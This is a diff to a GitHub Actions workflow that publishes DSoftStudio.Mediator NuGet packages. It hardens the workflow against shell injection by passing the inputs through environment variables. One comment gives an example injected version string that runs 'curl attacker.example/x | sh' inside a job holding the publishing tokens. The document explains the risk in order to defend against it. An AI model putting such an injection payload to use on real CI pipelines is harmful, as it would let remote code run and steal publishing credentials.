@@ -69,10 +69,15 @@ jobs:
       # GitHub Packages stays available from any branch: that is the rehearsal
       # target, and being able to push a build of a feature branch to it is the
       # reason there are two options here at all.
+      #
+      # Every value below reaches the shell through env, never through ${{ }}
+      # inside the script. See the note on the tag step for why.
       - name: Refuse to publish to NuGet.org from anywhere but main
         if: inputs.target == 'nuget.org' && github.ref != 'refs/heads/main'
+        env:
+          REF: ${{ github.ref }}
         run: |
-          echo "::error::NuGet.org can only be published from main. This run is on '${{ github.ref }}'."
+          echo "::error::NuGet.org can only be published from main. This run is on '$REF'."
           echo "Merge to main first, then run this workflow again with main selected."
           exit 1
 
@@ -97,11 +102,25 @@ jobs:
       #
       # Tags here are annotated (v1.3.0 is a tag object, not a commit), so the
       # ^{commit} dereference is load-bearing, not decoration.
+      #
+      # VERSION arrives as an environment variable rather than being pasted into
+      # the script by ${{ }}. That substitution happens BEFORE the shell sees the
+      # line, so a version of
+      #     1.4.0"; curl attacker.example/x | sh; echo "
+      # would be executed, not compared -- inside the one job that holds
+      # NUGET_API_KEY and GH_PKG_TOKEN. As $VERSION it is only ever data.
+      #
+      # `version` is a free-text input, so this is reachable by anyone who can
+      # press the button. The other inputs are choice/boolean and GitHub
+      # constrains them, but they go through env too: which inputs the platform
+      # happens to validate is not a thing to have to remember.
       - name: Require a release tag, reachable from main
         if: inputs.target == 'nuget.org'
+        env:
+          VERSION: ${{ inputs.version }}
         run: |
           set -e
-          tag="v${{ inputs.version }}"
+          tag="v$VERSION"
 
           if ! git rev-parse -q --verify "refs/tags/$tag" >/dev/null; then
             echo "::error::No tag '$tag' exists. Tag the release commit first: git tag -a $tag -m $tag && git push origin $tag"
@@ -157,11 +176,13 @@ jobs:
         run: dotnet test DSoftStudio.Mediator.slnx -c Release --no-build
 
       - name: Pack
+        env:
+          INCLUDE_COMPANIONS: ${{ inputs.include_companions }}
         run: |
           mkdir -p nupkgs
           dotnet pack src/DSoftStudio.Mediator.Abstractions -c Release --no-build -o nupkgs
           dotnet pack src/DSoftStudio.Mediator -c Release --no-build -o nupkgs
-          if [ "${{ inputs.include_companions }}" = "true" ]; then
+          if [ "$INCLUDE_COMPANIONS" = "true" ]; then
             dotnet pack src/DSoftStudio.Mediator.FluentValidation -c Release --no-build -o nupkgs
             dotnet pack src/DSoftStudio.Mediator.HybridCache     -c Release --no-build -o nupkgs
             dotnet pack src/DSoftStudio.Mediator.OpenTelemetry   -c Release --no-build -o nupkgs
@@ -176,11 +197,13 @@ jobs:
       # the accident this workflow exists to prevent. Typing the version means
       # you looked.
       - name: Verify the built version is the one you asked for
+        env:
+          VERSION: ${{ inputs.version }}
         run: |
           set -e
-          expected="nupkgs/DSoftStudio.Mediator.${{ inputs.version }}.nupkg"
+          expected="nupkgs/DSoftStudio.Mediator.$VERSION.nupkg"
           if [ ! -f "$expected" ]; then
-            echo "::error::Asked to publish ${{ inputs.version }}, but the build produced no such package."
+            echo "::error::Asked to publish $VERSION, but the build produced no such package."
             echo "What the build produced:"
             ls -1 nupkgs/
             echo
@@ -190,9 +213,11 @@ jobs:
           echo "Matched $expected"
 
       - name: List what will be published
+        env:
+          TARGET: ${{ inputs.target }}
         run: |
           {
-            echo "### Publishing to \`${{ inputs.target }}\`"
+            echo "### Publishing to \`$TARGET\`"
             echo
             echo '| Package |'
             echo '|---|'
